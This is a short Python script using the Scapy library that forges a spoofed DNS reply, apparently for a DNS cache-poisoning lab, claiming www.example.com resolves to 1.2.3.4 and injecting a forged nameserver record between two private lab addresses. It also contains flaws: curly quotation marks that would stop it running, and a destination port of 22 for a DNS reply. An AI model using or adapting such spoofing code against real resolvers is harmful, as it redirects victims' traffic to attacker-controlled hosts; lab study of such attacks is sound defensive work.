#!/usr/bin/python
from scapy.all import *

name = 'www.example.com'
domain = 'example.com'
ns = 'b.iana-servers.net'
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type=’A’, rdata=’1.2.3.4’, ttl=259200) 
NSsec = DNSRR(rrname=domain, type=’NS’, rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst='172.16.133.130', src='172.16.133.128')
udp = UDP(dport=22, sport=53, chksum=0) 
reply = ip/udp/dns

send(reply)